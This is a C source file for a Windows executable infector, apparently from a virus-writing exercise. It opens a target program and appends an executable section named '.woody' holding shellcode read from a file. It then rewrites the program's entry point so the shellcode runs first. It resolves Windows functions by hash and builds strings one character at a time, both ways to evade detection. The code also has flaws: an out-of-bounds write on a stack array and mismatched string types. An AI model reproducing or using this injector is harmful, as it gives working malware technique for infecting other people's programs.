#define WIN32_LEAN_AND_MEAN // Exclude rarely-used stuff from Windows headers

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"
#include "famine.h"
// #include <Windows.h> // only for types

void	*ft_memcpy(void *dst, const void *src, size_t n)
{
	size_t i;

	if (!dst && !src)
		return (0);
	i = 0;
	while (i < n)
	{
		((unsigned char *)dst)[i] = ((unsigned char *)src)[i];
		i++;
	}
	return (dst);
}

DWORD align(DWORD size, DWORD align, DWORD addr)
{
    if (!(size % align))
        return addr + size;
    return addr + (size / align + 1) * align;
}

// Structure for handling PE injection
typedef struct woody
{
    char *target;
    HANDLE file_handle;
    HANDLE file_mapping;
    LPVOID file_view;
    DWORD file_size;
    PIMAGE_NT_HEADERS nt_headers;
    PIMAGE_SECTION_HEADER section_headers;
    WORD number_of_sections;

    PCHAR shellcode;
    DWORD shellcode_size;
} woody;

// VOID clean_woody(woody *injector)
// {
//     if (injector->file_view)
//         UnmapViewOfFile(injector->file_view);
//     if (injector->file_mapping)
//         CloseHandle(injector->file_mapping);
//     if (injector->file_handle != INVALID_HANDLE_VALUE)
//         CloseHandle(injector->file_handle);
// }

BOOLEAN map_file(PCHAR pe_filename, woody *injector, PCHAR sc_filename)
{
    HANDLE hKernel32 = NULL;
    LDRLOADDLL pLdrLoadDll = NULL;
    LDRGETPROCADDRESS pLdrGetProcAddress = NULL;
    CREATEFILEA pCreateFileA = NULL;
    GETFILESIZE pGetFileSize = NULL;
    CREATEFILEMAPPINGA pCreateFileMappingA = NULL;
    MAPVIEWOFFILE pMapViewOfFile = NULL;
    CLOSEHANDLE pCloseHandle = NULL;

    WCHAR sKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' };

    // Resolve LdrLoadDll and LdrGetProcAddress
    pLdrLoadDll = GetProcAddressWithHash(LDRLOADDLL_HASH);
    pLdrGetProcAddress = GetProcAddressWithHash(LDRGETPROCADDRESS_HASH);

    if (!pLdrLoadDll || !pLdrGetProcAddress)
    {
        ERROR_SYS("GetProcAddress");
        return FALSE;
    }

    // Load kernel32.dll
    UNICODE_STRING uString = { 0 };
    uString.Buffer = sKernel32;
    uString.Length = sizeof(sKernel32);
    uString.MaximumLength = sizeof(sKernel32);

    pLdrLoadDll(NULL, 0, &uString, &hKernel32);
    if (!hKernel32)
    {
        ERROR_SYS("LdrLoadDll");
        return FALSE;
    }

    // Get function pointers for kernel32.dll functions
    pCreateFileA = (CREATEFILEA)GetProcAddressWithHash(CREATEFILEA_HASH);
    pGetFileSize = (GETFILESIZE)GetProcAddressWithHash(GETFILESIZE_HASH);
    pCreateFileMappingA = (CREATEFILEMAPPINGA)GetProcAddressWithHash(CREATEFILEMAPPINGA_HASH);
    pMapViewOfFile = (MAPVIEWOFFILE)GetProcAddressWithHash(MAPVIEWOFFILE_HASH);
    pCloseHandle = (CLOSEHANDLE)GetProcAddressWithHash(CLOSEHANDLE_HASH);

    if (!pCreateFileA || !pGetFileSize || !pCreateFileMappingA || !pMapViewOfFile || !pCloseHandle)
    {
        ERROR_SYS("GetProcAddress for kernel32");
        return FALSE;
    }

    // Use the dynamically retrieved functions to handle the file
    injector->file_handle = pCreateFileA(pe_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (injector->file_handle == INVALID_HANDLE_VALUE)
    {
        ERROR_SYS("CreateFileA");
        return FALSE;
    }

    injector->file_size = pGetFileSize(injector->file_handle, NULL);
    if (injector->file_size == INVALID_FILE_SIZE)
    {
        ERROR_SYS("GetFileSize");
        // clean_woody(injector);
        return FALSE;
    }

    injector->file_mapping = pCreateFileMappingA(injector->file_handle, NULL, PAGE_READWRITE, 0, injector->file_size, NULL);
    if (!injector->file_mapping)
    {
        ERROR_SYS("CreateFileMappingA");
        // clean_woody(injector);
        return FALSE;
    }

    injector->file_view = pMapViewOfFile(injector->file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, injector->file_size);
    if (!injector->file_view)
    {
        ERROR_SYS("MapViewOfFile");
        // clean_woody(injector);
        return FALSE;
    }

    // read shellcode from file path
    HANDLE hFile = pCreateFileA(sc_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        ERROR_SYS("CreateFileA");
        // clean_woody(injector);
        return FALSE;
    }

    injector->shellcode_size = pGetFileSize(hFile, NULL);
    if (injector->shellcode_size == INVALID_FILE_SIZE)
    {
        ERROR_SYS("GetFileSize");
        // clean_woody(injector);
        return FALSE;
    }

    // Create a file mapping object
    HANDLE hFileMapping = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, injector->shellcode_size, NULL);
    if (!hFileMapping)
    {
        ERROR_SYS("CreateFileMappingA");
        return FALSE;
    }

    injector->shellcode = (char *)pMapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, injector->shellcode_size);
    if (!injector->shellcode)
    {
        ERROR_SYS("MapViewOfFile");
        // clean_woody(injector);
        return FALSE;
    }




    // CloseHandle(hFile);

    return TRUE;
}


BOOLEAN read_pe_header(woody *injector)
{
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)injector->file_view;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
    {
        ERROR_SYS("Invalid DOS signature");
        return FALSE;
    }

    injector->nt_headers = (PIMAGE_NT_HEADERS)((BYTE *)injector->file_view + dos_header->e_lfanew);
    if (injector->nt_headers->Signature != IMAGE_NT_SIGNATURE)
    {
        ERROR_SYS("Invalid NT signature");
        return FALSE;
    }

    if (injector->nt_headers->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        ERROR_SYS("Unsupported architecture (64-bit only)");
        return FALSE;
    }

    if (!(injector->nt_headers->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE))
    {
        ERROR_SYS("File is not executable");
        return FALSE;
    }

    injector->number_of_sections = injector->nt_headers->FileHeader.NumberOfSections;
    injector->section_headers = IMAGE_FIRST_SECTION(injector->nt_headers);

    return TRUE;
}

VOID inject_shellcode(woody *injector)
{
    char section_name[SECTION_NAME_SIZE];
    section_name[0] = '.';
    section_name[1] = 'w';
    section_name[2] = 'o';
    section_name[3] = 'o';
    section_name[4] = 'd';
    section_name[5] = 'y';
    section_name[6] = '\0';  // Null terminator for safety
    section_name[7] = '\0';  // Padding to complete 8 bytes


    PIMAGE_SECTION_HEADER new_section;
    DWORD file_alignment, section_alignment;
    DWORD new_section_rva, new_section_raw_size, new_section_virtual_size;

    // Save the original entry point
    DWORD original_entry_point = injector->nt_headers->OptionalHeader.AddressOfEntryPoint;

    // Proceed with injecting the shellcode
    new_section = &injector->section_headers[injector->number_of_sections];

    ft_memcpy(new_section->Name, section_name, SECTION_NAME_SIZE);

    file_alignment = injector->nt_headers->OptionalHeader.FileAlignment;
    section_alignment = injector->nt_headers->OptionalHeader.SectionAlignment;

    new_section_rva = align(injector->section_headers[injector->number_of_sections - 1].Misc.VirtualSize,
                            section_alignment,
                            injector->section_headers[injector->number_of_sections - 1].VirtualAddress);

    new_section->VirtualAddress = new_section_rva;
    new_section_virtual_size = align(injector->shellcode_size, section_alignment, 0);
    new_section->Misc.VirtualSize = new_section_virtual_size;
    new_section_raw_size = align(injector->shellcode_size, file_alignment, 0);
    new_section->SizeOfRawData = new_section_raw_size;
    new_section->PointerToRawData = align(injector->section_headers[injector->number_of_sections - 1].SizeOfRawData,
                                          file_alignment,
                                          injector->section_headers[injector->number_of_sections - 1].PointerToRawData);
    new_section->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

    injector->nt_headers->OptionalHeader.SizeOfImage = new_section_rva + new_section_virtual_size;
    injector->nt_headers->FileHeader.NumberOfSections++;

    // Copy the shellcode into the new section
    ft_memcpy((BYTE *)injector->file_view + new_section->PointerToRawData, injector->shellcode, injector->shellcode_size);

    injector->file_size += new_section_raw_size;

    // Modify entry point to point to our new section
    injector->nt_headers->OptionalHeader.AddressOfEntryPoint = new_section_rva;

}

VOID inject_shellcode_pe(WCHAR *target, PCHAR sc_filename)
{
    woody injector;
    injector.target = target;

    if (!map_file(target, &injector, sc_filename))
        return;

    if (!read_pe_header(&injector))
    {
        // clean_woody(&injector);
        return;
    }

    inject_shellcode(&injector);

    // clean_woody(&injector);
}

VOID Run(VOID)
{
    #pragma warning( push )
    #pragma warning( disable : 4055 ) // Ignore cast warnings
    
    char test[5];
    test[0] = 'c';
    test[1] = '.';
    test[2] = 'e';
    test[3] = 'x';
    test[4] = 'e';
    test[5] = '\0';

    char shellcode[6];
    shellcode[0] = 't';
    shellcode[1] = '.';
    shellcode[2] = 'b';
    shellcode[3] = 'i';
    shellcode[4] = 'n';
    shellcode[5] = '\0';

    inject_shellcode_pe(test, shellcode);
}

int main(int argc, char *argv[])
{
    Run();
    return 0;
}
